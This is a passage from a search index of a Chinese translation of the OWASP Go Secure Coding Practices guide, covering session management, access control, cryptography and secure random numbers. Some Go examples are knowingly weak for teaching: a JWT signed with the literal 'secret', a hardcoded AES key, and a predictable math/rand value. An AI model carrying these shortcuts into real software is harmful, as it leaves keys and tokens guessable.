c\u5bf9\u6bd4\uff0c\u767b\u5f55\u7528\u6237\u5217\u8868\u901a\u5e38\u4fdd\u5b58\u5728\u6570\u636e\u5e93\u4e2d\u3002 \u4f1a\u8bdd\u6807\u8bc6\u7b26\u4e0d\u5141\u8bb8\u5b58\u50a8\u5728URL\u4e2d\uff0c\u4ec5\u5141\u8bb8\u4fdd\u5b58\u5728HTTP Cookie\u5934\u4e2d\u3002\u4e00\u4e2a\u4e0d\u597d\u7684\u5217\u5b50\u5c31\u662f\u4f7f\u7528GET\u4f20\u9012\u4f1a\u8bdd\u6807\u8bc6\u7b26\u53c2\u6570\u3002\u4f1a\u8bdd\u6570\u636e\u8fd8\u5fc5\u987b\u53d7\u5230\u4fdd\u62a4\uff0c\u4ee5\u9632\u670d\u52a1\u5668\u7684\u5176\u5b83\u7528\u6237\u672a\u7ecf\u6388\u6743\u76f4\u63a5\u8bbf\u95ee\u3002 HTTP\u6539\u4e3aHTTPS\uff0c\u9632\u6b62\u7f51\u7edc\u55c5\u63a2\u4f1a\u8bdd\u7684MITM\u653b\u51fb\u3002\u6700\u4f73\u5b9e\u8df5\u662f\u5728\u6240\u6709\u7684\u8bf7\u6c42\u4e2d\u4f7f\u7528HTTPS\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a err := http.ListenAndServeTLS( :443 , cert/cert.pem , cert/key.pem , nil) if err != nil { log.Fatal( ListenAndServe: , err) } \u5728\u9ad8\u654f\u611f\u6216\u5173\u952e\u64cd\u4f5c\u7684\u8bf7\u6c42\u4e2d\uff0c\u5e94\u8be5\u4e3a\u6bcf\u4e2a\u8bf7\u6c42\u800c\u4e0d\u662f\u6bcf\u4e2a\u4f1a\u8bdd\u751f\u6210\u4ee4\u724c\u3002\u59cb\u7ec8\u786e\u4fdd\u4ee4\u724c\u7684\u968f\u673a\u6027\uff0c\u5e76\u4e14\u8db3\u6709\u8db3\u591f\u7684\u5b89\u5168\u957f\u5ea6\u9632\u6b62\u66b4\u529b\u7834\u89e3\u3002 \u5728\u4f1a\u8bdd\u7ba1\u7406\u4e2d\u8981\u8003\u8651\u7684\u6700\u540e\u4e00\u4e2a\u65b9\u9762\u662f\u6ce8\u9500\u529f\u80fd\u3002\u5e94\u7528\u7a0b\u5e8f\u5e94\u8be5\u63d0\u4f9b\u4e00\u4e2a\u4ece\u6240\u6709\u9700\u8981\u8eab\u4efd\u9a8c\u8bc1\u7684\u9875\u9762\u6ce8\u9500\u7684\u65b9\u6cd5\uff0c\u5e76\u5b8c\u5168\u7ec8\u6b62\u5173\u8054\u7684\u4f1a\u8bdd\u548c\u94fe\u63a5\u3002\u793a\u4f8b\u4e2d\uff0c\u5f53\u7528\u6237\u6ce8\u9500\u65f6\uff0ccookie\u9700\u8981\u4ece\u5ba2\u6237\u7aef\u5220\u9664\uff0c\u4e5f\u9700\u8981\u4ece\u670d\u52a1\u7aef\u5220\u9664\u3002 ... cookie, err := req.Cookie( Auth ) //Our auth token if err != nil { res.Header().Set( Content-Type , text/html ) fmt.Fprint(res, Unauthorized - Please login br ) fmt.Fprintf(res, a href=\\ login\\ Login /a ) return } ... \u5b8c\u6574\u7684\u4f8b\u5b50\uff0c\u8bf7\u8bbf\u95ee\uff1a session.go","title":"Session\u7ba1\u7406"},{"location":"application-security/sdl/go-scp/#_23","text":"\u5728\u5904\u7406\u8bbf\u95ee\u63a7\u5236\u65f6\uff0c\u8981\u91c7\u53d6\u7684\u7b2c\u4e00\u6b65\u662f\u4ec5\u4f7f\u7528\u53d7\u4fe1\u4efb\u7684\u7cfb\u7edf\u5bf9\u8c61\u8fdb\u884c\u8bbf\u95ee\u6388\u6743\u51b3\u7b56\u3002\u5728 \u4f1a\u8bdd\u7ba1\u7406 \u90e8\u5206\u63d0\u4f9b\u7684\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528JWT\u5b9e\u73b0\u4e86\u8fd9\u4e00\u70b9\u3002JSONWeb\u4ee4\u724c\u5728\u670d\u52a1\u5668\u7aef\u751f\u6210\u4f1a\u8bdd\u4ee4\u724c\u3002 // create a JWT and put in the clients cookie func setToken(res http.ResponseWriter, req *http.Request) { //30m Expiration for non-sensitive applications - OWASP expireToken := time.Now().Add(time.Minute * 30).Unix() expireCookie := time.Now().Add(time.Minute * 30) //token Claims claims := Claims{ {...} } token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims) signedToken, _ := token.SignedString([]byte( secret )) \u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5b58\u50a8\u548c\u4f7f\u7528\u8fd9\u4e2a\u4ee4\u724c\u6765\u9a8c\u8bc1\u7528\u6237\u5e76\u5f3a\u5236\u6211\u4eec\u7684\u8bbf\u95ee\u63a7\u5236\u6a21\u578b\u3002 \u7528\u4e8e\u8bbf\u95ee\u6388\u6743\u7684\u7ec4\u4ef6\u5e94\u8be5\u662f\u4e00\u4e2a\u5355\u4e00\u7684\u3001\u5728\u7ad9\u70b9\u8303\u56f4\u5185\u4f7f\u7528\u7684\u7ec4\u4ef6\u3002\u8fd9\u5305\u62ec\u8c03\u7528\u5916\u90e8\u6388\u6743\u670d\u52a1\u7684\u5e93\u3002 \u5982\u679c\u51fa\u73b0\u6545\u969c\uff0c\u8bbf\u95ee\u63a7\u5236\u5e94\u5b89\u5168\u5931\u6548\u3002\u5728Go\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528Defer\u6765\u5b9e\u73b0\u8fd9\u4e00\u70b9\u3002\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u6587\u6863\u7684 \u9519\u8bef\u65e5\u5fd7 \u90e8\u5206\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u65e0\u6cd5\u8bbf\u95ee\u5176\u914d\u7f6e\u4fe1\u606f\uff0c\u5219\u5e94\u62d2\u7edd\u5bf9\u5e94\u7528\u7a0b\u5e8f\u7684\u6240\u6709\u8bbf\u95ee\u3002 \u5e94\u8be5\u5bf9\u6bcf\u4e2a\u8bf7\u6c42\u5b9e\u65bd\u6388\u6743\u63a7\u5236\uff0c\u5305\u62ec\u670d\u52a1\u5668\u7aef\u811a\u672c\u4ee5\u53ca\u6765\u81ea\u5ba2\u6237\u7aef\u6280\u672f\uff08\u5982Ajax\u6216Flash\uff09\u7684\u8bf7\u6c42\u3002 \u6b63\u786e\u5730\u5c06\u7279\u6743\u903b\u8f91\u4e0e\u5e94\u7528\u7a0b\u5e8f\u4ee3\u7801\u7684\u5176\u4f59\u90e8\u5206\u5206\u5f00\u4e5f\u662f\u5f88\u91cd\u8981\u7684\u3002 \u4e3a\u9632\u6b62\u672a\u7ecf\u6388\u6743\u7684\u7528\u6237\u8bbf\u95ee\uff0c\u5fc5\u987b\u6267\u884c\u8bbf\u95ee\u63a7\u5236\u7684\u5176\u4ed6\u91cd\u8981\u64cd\u4f5c\u5305\u62ec\uff1a \u6587\u4ef6\u548c\u5176\u4ed6\u8d44\u6e90 \u53d7\u4fdd\u62a4\u7684URL \u53d7\u4fdd\u62a4\u529f\u80fd \u76f4\u63a5\u5bf9\u8c61\u5f15\u7528 \u670d\u52a1 \u5e94\u7528\u7a0b\u5e8f\u6570\u636e \u7528\u6237\u548c\u6570\u636e\u5c5e\u6027\u4ee5\u53ca\u7b56\u7565\u4fe1\u606f \u5728\u63d0\u4f9b\u7684\u793a\u4f8b\u4e2d\uff0c\u6d4b\u8bd5\u7b80\u5355\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528\u3002 \u6b64\u4ee3\u7801\u57fa\u4e8e\u4f1a\u8bdd\u7ba1\u7406\u4e2d\u7684\u793a\u4f8b\u6784\u5efa \u3002 \u5728\u5b9e\u73b0\u8fd9\u4e9b\u8bbf\u95ee\u63a7\u5236\u65f6\uff0c\u91cd\u8981\u7684\u662f\u9a8c\u8bc1\u8bbf\u95ee\u63a7\u5236\u89c4\u5219\u7684\u670d\u52a1\u5668\u7aef\u5b9e\u73b0\u548c\u8868\u793a\u5c42\u8868\u793a\u662f\u5426\u5339\u914d\u3002 \u5982\u679c\u72b6\u6001\u6570\u636e\u9700\u8981\u5b58\u50a8\u5728\u5ba2\u6237\u7aef\uff0c\u5219\u9700\u8981\u4f7f\u7528\u52a0\u5bc6\u548c\u5b8c\u6574\u6027\u68c0\u67e5\u4ee5\u9632\u6b62\u7be1\u6539\u3002 \u5e94\u7528\u7a0b\u5e8f\u903b\u8f91\u6d41\u5fc5\u987b\u7b26\u5408\u4e1a\u52a1\u89c4\u5219\u3002 \u5904\u7406\u4e8b\u52a1\u65f6\uff0c\u5355\u4e2a\u7528\u6237\u6216\u8bbe\u5907\u5728\u7ed9\u5b9a\u65f6\u95f4\u6bb5\u5185\u53ef\u4ee5\u6267\u884c\u7684\u4e8b\u52a1\u6570\u5fc5\u987b\u9ad8\u4e8e\u4e1a\u52a1\u8981\u6c42\uff0c\u4f46\u5fc5\u987b\u8db3\u591f\u4f4e\uff0c\u4ee5\u9632\u6b62\u7528\u6237\u6267\u884cDoS\u7c7b\u578b\u7684\u653b\u51fb\u3002 \u91cd\u8981\u7684\u662f\u8981\u6ce8\u610f\uff0c\u4ec5\u4f7f\u7528referer HTTP\u5934\u4e0d\u8db3\u4ee5\u9a8c\u8bc1\u6388\u6743\uff0c\u5e94\u4ec5\u7528\u4f5c\u8865\u5145\u68c0\u67e5\u3002 \u5bf9\u4e8e\u7ecf\u8fc7\u957f\u65f6\u95f4\u9a8c\u8bc1\u7684\u4f1a\u8bdd\uff0c\u5e94\u7528\u7a0b\u5e8f\u5e94\u5b9a\u671f\u91cd\u65b0\u8bc4\u4f30\u7528\u6237\u7684\u6388\u6743\uff0c\u4ee5\u9a8c\u8bc1\u7528\u6237\u7684\u6743\u9650\u662f\u5426\u672a\u66f4\u6539\u3002\u5982\u679c\u6743\u9650\u5df2\u66f4\u6539\uff0c\u8bf7\u6ce8\u9500\u7528\u6237\u5e76\u5f3a\u5236\u4ed6\u4eec\u91cd\u65b0\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002 \u4e3a\u4e86\u9075\u5b88\u5b89\u5168\u7a0b\u5e8f\uff0c\u7528\u6237\u5e10\u6237\u8fd8\u5e94\u8be5\u6709\u4e00\u79cd\u5ba1\u8ba1\u65b9\u6cd5\u3002\uff08\u4f8b\u5982\uff0c\u5728\u5bc6\u7801\u8fc7\u671f30\u5929\u540e\u7981\u7528\u7528\u6237\u5e10\u6237\uff09\u3002 \u5e94\u7528\u7a0b\u5e8f\u8fd8\u5fc5\u987b\u652f\u6301\u5728\u7528\u6237\u7684\u6388\u6743\u88ab\u64a4\u9500\u65f6\u7981\u7528\u5e10\u6237\u548c\u7ec8\u6b62\u4f1a\u8bdd\u3002\uff08\u4f8b\u5982\u89d2\u8272\u53d8\u66f4\u3001\u5c31\u4e1a\u72b6\u51b5\u7b49\uff09\u3002 \u5f53\u652f\u6301\u5916\u90e8\u670d\u52a1\u5e10\u6237\u548c\u652f\u6301\u4ece\u5916\u90e8\u7cfb\u7edf\u6216\u5230\u5916\u90e8\u7cfb\u7edf\u7684\u8fde\u63a5\u7684\u5e10\u6237\u65f6\uff0c\u8fd9\u4e9b\u5e10\u6237\u5fc5\u987b\u4ee5\u5c3d\u53ef\u80fd\u4f4e\u7684\u6743\u9650\u7ea7\u522b\u8fd0\u884c\u3002","title":"\u8bbf\u95ee\u63a7\u5236"},{"location":"application-security/sdl/go-scp/#_24","text":"\u8ba9\u6211\u4eec\u8ba9\u7b2c\u4e00\u53e5\u8bdd\u50cf\u60a8\u7684\u52a0\u5bc6\u6280\u672f\u4e00\u6837\u5f3a\u5927\uff1a \u54c8\u5e0c\u548c\u52a0\u5bc6\u662f\u4e24\u79cd\u4e0d\u540c\u7684\u4e1c\u897f \u3002 \u8fd9\u662f\u4e00\u4e2a\u666e\u904d\u7684\u8bef\u89e3\uff0c\u800c\u4e14\u5927\u591a\u6570\u65f6\u5019\u54c8\u5e0c\u548c\u52a0\u5bc6\u662f\u4ea4\u66ff\u4f7f\u7528\u7684\uff0c\u9519\u8bef\u7684\u3002\u5b83\u4eec\u662f\u4e0d\u540c\u7684\u6982\u5ff5\uff0c\u4e5f\u6709\u4e0d\u540c\u7684\u7528\u9014\u3002 \u54c8\u5e0c\u662f\u7531\uff08\u54c8\u5e0c\uff09\u51fd\u6570\u4ece\u6e90\u6570\u636e\u751f\u6210\u7684\u5b57\u7b26\u4e32\u6216\u6570\u5b57\uff1a hash := F(data) \u54c8\u5e0c\u7684\u957f\u5ea6\u56fa\u5b9a\uff0c\u5176\u503c\u968f\u8f93\u5165\u7684\u5fae\u5c0f\u53d8\u5316\u800c\u53d8\u5316\u5f88\u5927\uff08\u4ecd\u53ef\u80fd\u53d1\u751f\u51b2\u7a81\uff09\u3002\u597d\u7684\u54c8\u5e0c\u7b97\u6cd5\u4e0d\u5141\u8bb8\u5c06\u54c8\u5e0c\u8f6c\u6362\u4e3a\u5176\u539f\u59cb\u6e90\u3002MD5\u662f\u6700\u6d41\u884c\u7684\u6563\u5217\u7b97\u6cd5\uff0c\u4f46\u5b89\u5168\u6027 blake2 \u88ab\u8ba4\u4e3a\u662f\u6700\u5f3a\u548c\u6700\u7075\u6d3b\u7684\u3002 Go\u8865\u5145\u52a0\u5bc6\u5e93\u63d0\u4f9b\u4e86 blake2b \uff08\u6216\u4ec5blake2\uff09\u548c blake2s \u5b9e\u73b0\uff1a\u524d\u8005\u9488\u5bf964\u4f4d\u5e73\u53f0\u8fdb\u884c\u4e86\u4f18\u5316\uff0c\u540e\u8005\u9488\u5bf98\u523032\u4f4d\u5e73\u53f0\u8fdb\u884c\u4e86\u4f18\u5316\u3002\u5982\u679cblake2\u4e0d\u53ef\u7528\uff0c\u5219sha-256\u662f\u6b63\u786e\u7684\u9009\u9879\u3002 \u6bcf\u5f53\u4f60\u6709\u4e00\u4e9b\u4f60\u4e0d\u9700\u8981\u77e5\u9053\u5b83\u662f\u4ec0\u4e48\u7684\u4e1c\u897f\uff0c\u4f46\u53ea\u6709\u5f53\u5b83\u662f\u5e94\u8be5\u662f\u4ec0\u4e48\u7684\u65f6\u5019\uff08\u6bd4\u5982\u4e0b\u8f7d\u540e\u68c0\u67e5\u6587\u4ef6\u5b8c\u6574\u6027\uff09\uff0c\u4f60\u5e94\u8be5\u4f7f\u7528hashing package main import fmt import io import crypto/md5 import crypto/sha256 import golang.org/x/crypto/blake2s func main () { h_md5 := md5.New() h_sha := sha256.New() h_blake2s, _ := blake2s.New256(nil) io.WriteString(h_md5, Welcome to Go Language Secure Coding Practices ) io.WriteString(h_sha, Welcome to Go Language Secure Coding Practices ) io.WriteString(h_blake2s, Welcome to Go Language Secure Coding Practices ) fmt.Printf( MD5 : %x\\n , h_md5.Sum(nil)) fmt.Printf( SHA256 : %x\\n , h_sha.Sum(nil)) fmt.Printf( Blake2s-256: %x\\n , h_blake2s.Sum(nil)) } \u8f93\u51fa MD5 : ea9321d8fb0ec6623319e49a634aad92 SHA256 : ba4939528707d791242d1af175e580c584dc0681af8be2a4604a526e864449f6 Blake2s-256: 1d65fa02df8a149c245e5854d980b38855fd2c78f2924ace9b64e8b21b3f2f82 \u6ce8\u610f \uff1a\u8981\u8fd0\u884c\u6e90\u4ee3\u7801\u793a\u4f8b\uff0c\u60a8\u9700\u8981\u8fd0\u884c $go get golang.org/x/crypto/blake2s \u53e6\u4e00\u65b9\u9762\uff0c\u52a0\u5bc6\u4f7f\u7528\u5bc6\u94a5\u5c06\u6570\u636e\u8f6c\u6362\u4e3a\u53ef\u53d8\u957f\u5ea6\u7684\u6570\u636e encrypted_data := F(data, key) \u4e0e\u6563\u5217\u4e0d\u540c\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6b63\u786e\u7684\u89e3\u5bc6\u51fd\u6570\u548c\u5bc6\u94a5\uff0c\u4ece\u52a0\u5bc6\u7684\u6570\u636e\u4e2d\u8ba1\u7b97\u6570\u636e\u3002 data := F\u207b\u00b9(encrypted_data, key) \u5f53\u60a8\u9700\u8981\u901a\u4fe1\u6216\u5b58\u50a8\u654f\u611f\u6570\u636e\u65f6\uff0c\u5e94\u4f7f\u7528\u52a0\u5bc6\uff0c\u60a8\u6216\u5176\u4ed6\u4eba\u7a0d\u540e\u9700\u8981\u8bbf\u95ee\u8fd9\u4e9b\u654f\u611f\u6570\u636e\u8fdb\u884c\u8fdb\u4e00\u6b65\u5904\u7406\u3002\u4e00\u4e2a\u201c\u7b80\u5355\u201d\u7684\u52a0\u5bc6\u7528\u4f8b\u662f\u5b89\u5168\u7684https-hyper-text\u4f20\u8f93\u534f\u8bae\u3002AES\u662f\u5bf9\u79f0\u5bc6\u94a5\u52a0\u5bc6\u7684\u4e8b\u5b9e\u6807\u51c6\u3002\u8be5\u7b97\u6cd5\u548c\u5176\u4ed6\u5bf9\u79f0\u5bc6\u7801\u4e00\u6837\uff0c\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u6a21\u5f0f\u4e0b\u5b9e\u73b0\u3002\u60a8\u4f1a\u6ce8\u610f\u5230\u5728\u4e0b\u9762\u7684\u4ee3\u7801\u793a\u4f8b\u4e2d\uff0c\u4f7f\u7528\u4e86gcm\uff08galois counter\u6a21\u5f0f\uff09\uff0c\u800c\u4e0d\u662f\u66f4\u6d41\u884c\u7684\uff08\u81f3\u5c11\u5728\u5bc6\u7801\u5b66\u4ee3\u7801\u793a\u4f8b\u4e2d\uff09cbc/ecb\u3002GCM\u548cCBC/ECB\u4e4b\u95f4\u7684\u4e3b\u8981\u533a\u522b\u5728\u4e8e\u524d\u8005\u662f\u4e00\u79cd\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u5bc6\u7801\u6a21\u5f0f\uff0c\u8fd9\u610f\u5473\u7740\u5728\u52a0\u5bc6\u9636\u6bb5\u4e4b\u540e\uff0c\u5728\u5bc6\u6587\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u8eab\u4efd\u9a8c\u8bc1\u6807\u7b7e\uff0c\u7136\u540e\u5728\u6d88\u606f\u89e3\u5bc6\u4e4b\u524d\u5bf9\u5176\u8fdb\u884c\u9a8c\u8bc1\uff0c\u4ee5\u786e\u4fdd\u6d88\u606f\u6ca1\u6709\u88ab\u7be1\u6539\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u60a8\u6709\u516c\u94a5\u5bc6\u7801\u672f\u6216\u4f7f\u7528\u6210\u5bf9\u5bc6\u94a5\u7684\u975e\u5bf9\u79f0\u5bc6\u7801\u672f\uff1apublic\u548cprivate\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u516c\u94a5\u5bc6\u7801\u5b66\u7684\u6027\u80fd\u4e0d\u5982\u5bf9\u79f0\u5bc6\u94a5\u5bc6\u7801\u5b66\uff0c\u56e0\u6b64\u5176\u6700\u5e38\u89c1\u7684\u7528\u4f8b\u662f\u4f7f\u7528\u975e\u5bf9\u79f0\u5bc6\u7801\u5b66\u5728\u53cc\u65b9\u4e4b\u95f4\u5171\u4eab\u5bf9\u79f0\u5bc6\u94a5\uff0c\u8fd9\u6837\u4ed6\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528\u5bf9\u79f0\u5bc6\u94a5\u4ea4\u6362\u4f7f\u7528\u5bf9\u79f0\u5bc6\u7801\u5b66\u52a0\u5bc6\u7684\u6d88\u606f\u3002\u9664\u4e8690\u5e74\u4ee3\u7684AES\u6280\u672f\u5916\uff0cGo\u4f5c\u8005\u5df2\u7ecf\u5f00\u59cb\u5b9e\u65bd\u548c\u652f\u6301\u66f4\u73b0\u4ee3\u7684\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\uff0c\u8fd9\u4e9b\u7b97\u6cd5\u4e5f\u63d0\u4f9b\u8eab\u4efd\u9a8c\u8bc1\uff0c\u4f8b\u5982chacha20poly1305\u3002 Go\u4e2d\u53e6\u4e00\u4e2a\u6709\u8da3\u7684\u5305\u662fx/crypto/nacl\u3002\u8fd9\u662fDanielJ.Bernstein\u535a\u58eb\u7684Nacl\u56fe\u4e66\u9986\u7684\u53c2\u8003\u8d44\u6599\uff0c\u5b83\u662f\u4e00\u4e2a\u975e\u5e38\u6d41\u884c\u7684\u73b0\u4ee3\u5bc6\u7801\u5b66\u56fe\u4e66\u9986\u3002go\u4e2d\u7684nacl/box\u548cnacl/secretbox\u662fnacl\u4e3a\u4e24\u4e2a\u6700\u5e38\u89c1\u7684\u7528\u4f8b\u53d1\u9001\u52a0\u5bc6\u6d88\u606f\u7684\u62bd\u8c61\u5b9e\u73b0\uff1a \u4f7f\u7528\u516c\u94a5\u52a0\u5bc6\uff08nacl/box\uff09\u5728\u53cc\u65b9\u4e4b\u95f4\u53d1\u9001\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u52a0\u5bc6\u6d88\u606f \u4f7f\u7528\u5bf9\u79f0\uff08\u5373\u5bc6\u94a5\uff09\u52a0\u5bc6\u6280\u672f\u5728\u53cc\u65b9\u4e4b\u95f4\u53d1\u9001\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u52a0\u5bc6\u6d88\u606f \u5982\u679c\u7b26\u5408\u60a8\u7684\u7528\u4f8b\uff0c\u90a3\u4e48\u6700\u597d\u4f7f\u7528\u5176\u4e2d\u4e00\u4e2a\u62bd\u8c61\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u4f7f\u7528AES\u3002 package main import fmt import crypto/aes import crypto/cipher import crypto/rand func main() { key := []byte( Encryption Key should be 32 char ) data := []byte( Welcome to Go Language Secure Coding Practices ) block, err := aes.NewCipher(key) if err != nil { panic(err.Error()) } nonce := make([]byte, 12) if _, err := rand.Read(nonce); err != nil { panic(err.Error()) } aesgcm, err := cipher.NewGCM(block) if err != nil { panic(err.Error()) } encrypted_data := aesgcm.Seal(nil, nonce, data, nil) fmt.Printf( Encrypted: %x\\n , encrypted_data) decrypted_data, err := aesgcm.Open(nil, nonce, encrypted_data, nil) if err != nil { panic(err.Error()) } fmt.Printf( Decrypted: %s\\n , decrypted_data) } Encrypted: a66bd44db1fac7281c33f6ca40494a320644584d0595e5a0e9a202f8aeb22dae659dc06932d4e409fe35a95d14b1cffacbe3914460dd27cbd274b0c3a561 Decrypted: Welcome to Go Language Secure Coding Practices \u8bf7\u6ce8\u610f\uff0c\u60a8\u5e94\u8be5\u201c\u5efa\u7acb\u5e76\u4f7f\u7528\u4e00\u4e2a\u5982\u4f55\u7ba1\u7406\u52a0\u5bc6\u5bc6\u94a5\u7684\u7b56\u7565\u548c\u8fc7\u7a0b\u201d\uff0c\u4fdd\u62a4\u201c\u4e3b\u79d8\u5bc6\u4e0d\u53d7\u672a\u7ecf\u6388\u6743\u7684\u8bbf\u95ee\u201d\u3002\u4e5f\u5c31\u662f\u8bf4\uff1a\u60a8\u7684\u52a0\u5bc6\u5bc6\u94a5\u4e0d\u5e94\u8be5\u786c\u7f16\u7801\u5728\u6e90\u4ee3\u7801\u4e2d\uff08\u5982\u672c\u4f8b\u4e2d\u6240\u793a\uff09\u3002 go crypto package \u6536\u96c6\u5e38\u89c1\u7684\u52a0\u5bc6\u5e38\u91cf\uff0c\u4f46\u5b9e\u73b0\u6709\u81ea\u5df1\u7684\u5305\uff0c\u5982crypto/md5\u5305\u3002 \u5927\u591a\u6570\u73b0\u4ee3\u5bc6\u7801\u7b97\u6cd5\u90fd\u662f\u5728 https://godoc.org/golang.org/x/crypto \u4e0b\u5b9e\u73b0\u7684\uff0c\u56e0\u6b64\u5f00\u53d1\u4eba\u5458\u5e94\u8be5\u5173\u6ce8\u90a3\u4e9b\u7b97\u6cd5\uff0c\u800c\u4e0d\u662f [crypto/*package](https://golang.org/pkg/crypto/) \u3002","title":"\u5bc6\u7801\u5b66\u5b9e\u8df5"},{"location":"application-security/sdl/go-scp/#_25","text":"\u5728OWASP\u5b89\u5168\u7f16\u7801\u5b9e\u8df5\u4e2d\uff0c\u60a8\u4f1a\u53d1\u73b0\u4e00\u6761\u4f3c\u4e4e\u975e\u5e38\u590d\u6742\u7684\u51c6\u5219\uff1a\u201c\u5f53\u8fd9\u4e9b\u968f\u673a\u503c\u4e0d\u53ef\u731c\u6d4b\u65f6\uff0c\u6240\u6709\u968f\u673a\u6570\u3001\u968f\u673a\u6587\u4ef6\u540d\u3001\u968f\u673aguid\u548c\u968f\u673a\u5b57\u7b26\u4e32\u90fd\u5e94\u4f7f\u7528\u52a0\u5bc6\u6a21\u5757\u6279\u51c6\u7684\u968f\u673a\u6570\u751f\u6210\u5668\u751f\u6210\u201d\uff0c\u56e0\u6b64\u8ba9\u6211\u4eec\u6765\u8c08\u8c08\u201c\u968f\u673a\u6570\u201d\u3002 \u5bc6\u7801\u5b66\u4f9d\u8d56\u4e8e\u67d0\u79cd\u968f\u673a\u6027\uff0c\u4f46\u4e3a\u4e86\u6b63\u786e\u8d77\u89c1\uff0c\u5927\u591a\u6570\u7f16\u7a0b\u8bed\u8a00\u63d0\u4f9b\u7684\u73b0\u6210\u7684\u662f\u4e00\u4e2a\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff1a go's math/rand \u4e0d\u4f8b\u5916\u3002 \u5f53\u6587\u6863\u4e2d\u58f0\u660e\u201c\u9876\u7ea7\u51fd\u6570\uff08\u5982float64\u548cint\uff09\u4f7f\u7528\u9ed8\u8ba4\u5171\u4eab\u6e90\u65f6\uff0c\u60a8\u5e94\u8be5\u4ed4\u7ec6\u9605\u8bfb\u8be5\u6587\u6863\uff0c\u8be5\u5171\u4eab\u6e90\u6bcf\u6b21\u8fd0\u884c\u7a0b\u5e8f\u65f6\u90fd\u4f1a\u751f\u6210\u786e\u5b9a\u7684\u503c\u5e8f\u5217\u3002\u201d\uff08 source \uff09 \u8fd9\u5230\u5e95\u662f\u4ec0\u4e48\u610f\u601d\uff1f\u8ba9\u6211\u4eec\u770b\u770b package main import fmt import math/rand func main() { fmt.Println( Random Number: , rand.Intn(1984)) } \u8fd0\u884c\u8fd9\u4e2a\u7a0b\u5e8f\u51e0\u6b21\u4f1a\u5bfc\u81f4\u5b8c\u5168\u76f8\u540c\u7684\u6570\u5b57/\u5e8f\u5217\uff0c\u4f46\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f $ for i in {1..5}; do go run rand.go; done Random Number: 1825 Random Number: 1825 Random Number: 1825 Random Number: 1825 Random Number: 1825 \u56e0\u4e3a Go's Math/Rand \u548c\u5176\u4ed6\u8bb8\u591a\u65b9\u6cd5\u4e00\u6837\u662f\u4e00\u4e2a\u786e\u5b9a\u6027\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u6240\u4ee5\u5b83\u4eec\u4f7f\u7528\u4e00\u4e2a\u79f0\u4e3aseed\u7684\u6e90\u3002\u8fd9\u4e2a\u79cd\u5b50\u53ea\u8d1f\u8d23\u786e\u5b9a\u6027\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u7684\u968f\u673a\u6027\u2014\u2014\u5982\u679c\u5df2\u77e5\u6216\u53ef\u9884\u6d4b\uff0c\u751f\u6210\u7684\u6570\u5b57\u5e8f\u5217\u4e5f\u4f1a\u53d1\u751f\u540c\u6837\u7684\u60c5\u51b5\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528 math/rand seed function \u4e3a\u6bcf\u4e2a\u7a0b\u5e8f\u6267\u884c\u83b7\u53d6\u9884\u671f\u7684\u4e94\u4e2a\u4e0d\u540c\u503c\u6765\u201c\u4fee\u590d\u201d\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u4f46\u662f\u56e0\u4e3a\u6211\u4eec\u5728cryptographic practices\u90e8\u5206\uff0c\u6240\u4ee5\u6211\u4eec\u5e94\u8be5\u9075\u5faa go's crypto/rand package \u3002 package main import fmt import math/big import crypto/rand func main() { rand, err := rand.Int(rand.Reader, big.NewInt(1984)) if err != nil { panic(err) } fmt.Printf( Random Number: %d\\n , rand) } \u60a8\u53ef\u80fd\u4f1a\u6ce8\u610f\u5230\u8fd0\u884c crypto/rand \u6bd4 math/rand \u6162\uff0c\u4f46\u8fd9\u662f\u610f\u6599\u4e4b\u4e2d\u7684\uff1a\u6700\u5feb\u7684\u7b97\u6cd5\u5e76\u4e0d\u603b\u662f\u6700\u5b89\u5168\u7684\u3002crypto\u7684rand\u5b9e\u73b0\u8d77\u6765\u4e5f\u66f4\u5b89\u5168\uff1b\u4e00\u4e2a\u4f8b\u5b50\u662f\uff0c\u60a8\u4e0d\u80fd\u79cd\u5b50crypto/rand\uff0c\u5e93\u4e3a\u6b64\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u968f\u673a\u6027\uff0c\u9632\u6b62\u5f00\u53d1\u4eba\u5458\u6ee5\u7528\u3002 $ for i in {1..5}; do go run rand-safe.go; done Random Number: 277 Random Number: 1572 Random Number: 1793 Random Number: 1328 Random Number: 1378 \u5982\u679c\u60a8\u5bf9\u5982\u4f55\u5229\u7528\u8fd9\u4e00\u70b9\u5f88\u597d\u5947\uff0c\u90a3\u4e48\u60f3\u60f3\u5982\u679c\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u5728\u7528\u6237\u6ce8\u518c\u65f6\u521b\u5efa\u4e00\u4e2a\u9ed8\u8ba4\u5bc6\u7801\uff0c\u901a\u8fc7\u8ba1\u7b97\u7528 go's math/rand \u751f\u6210\u7684\u4f2a\u968f\u673a\u6570\u7684\u6563\u5217\u503c\uff0c\u4f1a\u53d1\u751f\u4ec0\u4e48\u60c5\u51b5\uff0c\u5982\u7b2c\u4e00\u4e2a\u793a\u4f8b\u6240\u793a\uff1f 